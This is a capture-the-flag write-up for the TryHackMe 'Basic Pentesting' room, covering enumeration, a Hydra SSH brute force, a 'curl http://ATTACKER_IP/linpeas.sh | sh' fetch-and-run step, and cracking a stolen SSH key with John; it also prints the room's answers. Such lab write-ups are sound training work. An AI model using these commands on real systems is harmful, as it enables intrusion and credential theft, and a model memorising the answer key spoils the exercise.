# üîê Basic Pentesting ‚Äî TryHackMe Write-Up

> A beginner-friendly machine that teaches **web app exploitation** and **Linux privilege escalation**.  
> Room: **[Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)**

<p align="center">
  <img src="https://i.postimg.cc/3xcyBP7r/99c72676aab814b94e3bc350ba627b71.png" />
</p>


<p align="center">
  <a href="https://i.postimg.cc/3xcyBP7r/99c72676aab814b94e3bc350ba627b71.png">
    <img src="https://img.shields.io/badge/TryHackMe-Basic%20Pentesting-red?logo=tryhackme&logoColor=white" /></a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-brightgreen" />
  <img src="https://img.shields.io/badge/Focus-Web%20%7C%20Enum%20%7C%20PrivEsc-blue" />
  <img src="https://img.shields.io/badge/Platform-Linux-black?logo=linux" />
</p>

---

## üìö Table of Contents
- [About](#-about)
- [Topics Covered](#-topics-covered)
- [Appendix Archive](#-appendix-archive)
- [Tools & Alternatives](#-tools--alternatives)
- [Walkthrough](#-walkthrough)
  - [Connect & Deploy](#connect--deploy)
  - [Service Enumeration](#service-enumeration)
  - [Web Enumeration](#web-enumeration)
  - [Bruteforcing & Credentials](#bruteforcing--credentials)
  - [SSH Access](#ssh-access)
  - [Privilege Escalation](#privilege-escalation)
- [Answers (Hidden)](#-answers-hidden)
- [Credits & Disclaimer](#-credits--disclaimer)

---

## üîé About
This machine is great for practicing:
- Web enumeration & exploitation
- User enumeration
- Hash cracking
- Privilege escalation

---

## ‚úÖ Topics Covered
- Web Enumeration  
- Linux Enumeration  
- Brute Forcing Hashes  
- Brute Forcing SSH Keys  



## üöÄ Walkthrough

### Connect & Deploy
1. Connect to TryHackMe VPN with your `.ovpn` file:  
   ```bash
   sudo openvpn yourconfig.ovpn
   ```
2. Deploy the machine and note its IP: `MACHINE_IP`

---

### Service Enumeration
**[nmap](https://www.kali.org/tools/nmap/)**
```bash
nmap -sC -sV -A MACHINE_IP
```

Finds open ports: `22 (SSH)`, `80 (HTTP)`, `139/445 (SMB)`

---

### Web Enumeration
Use **[Gobuster](https://www.kali.org/tools/gobuster/)** to find hidden directories:

```bash
gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.103.107/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/15 08:34:37 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/development (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/09/15 08:34:54 Finished
===============================================================
```

Finds:
```
/development
```
‚úÖ Hidden directory identified.

---

### Bruteforcing & Credentials

**[enum4linux](https://www.kali.org/tools/enum4linux/)**
```bash
enum4linux -a MACHINE_IP | tee enum4linux.log
```

```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Sep 15 08:36:39 2020

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.10.103.107
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =====================================================
|    Enumerating Workgroup/Domain on 10.10.103.107    |
 =====================================================
[+] Got domain/workgroup name: WORKGROUP

 =============================================
|    Nbtstat Information for 10.10.103.107    |
 =============================================
Looking up status of 10.10.103.107
        BASIC2          <00> -         B <ACTIVE>  Workstation Service
        BASIC2          <03> -         B <ACTIVE>  Messenger Service
        BASIC2          <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ======================================
|    Session Check on 10.10.103.107    |
 ======================================
[+] Server 10.10.103.107 allows sessions using username '', password ''

 ============================================
|    Getting domain SID for 10.10.103.107    |
 ============================================
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =======================================
|    OS information on 10.10.103.107    |
 =======================================
Use of uninitialized value $os_info in concatenation (.) or string at /usr/share/enum4linux/enum4linux.pl line 464.
[+] Got OS info for 10.10.103.107 from smbclient:
[+] Got OS info for 10.10.103.107 from srvinfo:
        BASIC2         Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ==============================
|    Users on 10.10.103.107    |
 ==============================
Use of uninitialized value $users in print at /usr/share/enum4linux/enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at /usr/share/enum4linux/enum4linux.pl line 877.

Use of uninitialized value $users in print at /usr/share/enum4linux/enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at /usr/share/enum4linux/enum4linux.pl line 890.

 ==========================================
|    Share Enumeration on 10.10.103.107    |
 ==========================================

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.103.107
//10.10.103.107/Anonymous       Mapping: OK, Listing: OK
//10.10.103.107/IPC$    [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 =====================================================
|    Password Policy Information for 10.10.103.107    |
 =====================================================
[E] Unexpected error from polenum:


[+] Attaching to 10.10.103.107 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Missing required parameter 'digestmod'.

[+] Trying protocol 445/SMB...

        [!] Protocol failed: Missing required parameter 'digestmod'.


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ===============================
|    Groups on 10.10.103.107    |
 ===============================

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================
|    Users on 10.10.103.107 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2853212168-2008227510-3551253869
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''
S-1-5-21-2853212168-2008227510-3551253869-500 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-501 BASIC2\nobody (Local User)
[...]
S-1-5-21-2853212168-2008227510-3551253869-513 BASIC2\None (Domain Group)
[...]
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
[...]
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
[...]
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

 ==============================================
|    Getting printer info for 10.10.103.107    |
 ==============================================
No printers returned.


enum4linux complete on Tue Sep 15 08:40:44 2020
```

```

Finds possible users: `jan`, `kay`.
```

**[Hydra](https://www.kali.org/tools/hydra/) ‚Äî SSH Brute Force**
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt MACHINE_IP ssh
```
```
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-15 08:39:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.103.107:22/
[STATUS] 178.00 tries/min, 178 tries in 00:01h, 14344223 to do in 1343:06h, 16 active
[STATUS] 124.00 tries/min, 372 tries in 00:03h, 14344029 to do in 1927:58h, 16 active
[22][ssh] host: 10.10.103.107   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-15 08:46:06
```

Result:
- Username ‚ûú `jan`
- Password ‚ûú <details><summary><strong>Reveal Password</strong></summary>

  ```txt
  armando
  ```
  </details>

---

### SSH Access
Connect as `jan`:
```bash
ssh jan@MACHINE_IP
```

---

### Privilege Escalation

Use **[linpeas](https://www.kali.org/tools/peass-ng/)** for local enumeration:
```bash
# Attacker machine
python3 -m http.server 80

# Target machine
curl http://ATTACKER_IP/linpeas.sh | sh
```

```
[+] Files inside others home (limit 20)
/home/kay/.profile
/home/kay/.viminfo
/home/kay/.bashrc
/home/kay/.bash_history
/home/kay/.lesshst
/home/kay/.ssh/authorized_keys
/home/kay/.ssh/id_rsa
/home/kay/.ssh/id_rsa.pub
/home/kay/.bash_logout
/home/kay/.sudo_as_admin_successful
/home/kay/pass.bak
```


Finds interesting files in `/home/kay/`:
- `.ssh/id_rsa`
- `pass.bak`

**Exploit SSH Key**
1. Copy `id_rsa` back to attacker.  
2. Convert and crack with John:

```bash
/usr/share/john/ssh2john.py kay_id_rsa > kay_id_rsa.jtr
john --wordlist=/usr/share/wordlists/rockyou.txt kay_id_rsa.jtr
```
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
*******         (kay_id_rsa)
1g 0:00:00:12 DONE (2020-09-15 09:05) 0.08143g/s 1167Kp/s 1167Kc/s 1167KC/sa6_123..*7¬°Vamos!
Session completed
```
<details>
  <summary><strong>Kay‚Äôs Key Passphrase</strong></summary>

beeswax


</details>

**Login as kay**
```bash
ssh -i kay_id_rsa kay@MACHINE_IP
```

Read `pass.bak`:
```txt
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

---

## üß© Answers (Hidden)

<details>
  <summary><strong>Hidden Directory</strong></summary>

  ```txt
  development
  ```
</details>

<details>
  <summary><strong>Username</strong></summary>

  ```txt
  jan
  ```
</details>

<details>
  <summary><strong>Password</strong></summary>

  ```txt
  armando
  ```
</details>

<details>
  <summary><strong>Service</strong></summary>

  ```txt
  SSH
  ```
</details>

<details>
  <summary><strong>Other User</strong></summary>

  ```txt
  kay
  ```
</details>

<details>
  <summary><strong>Kay‚Äôs Key Passphrase</strong></summary>

  ```txt
  beeswax
  ```
</details>

<details>
  <summary><strong>Final Password</strong></summary>

  ```txt
  heresareallystrongpasswordthatfollowsthepasswordpolicy$$
  ```
</details>

---


### ‚≠ê If this helped you, consider leaving a star on the repo!
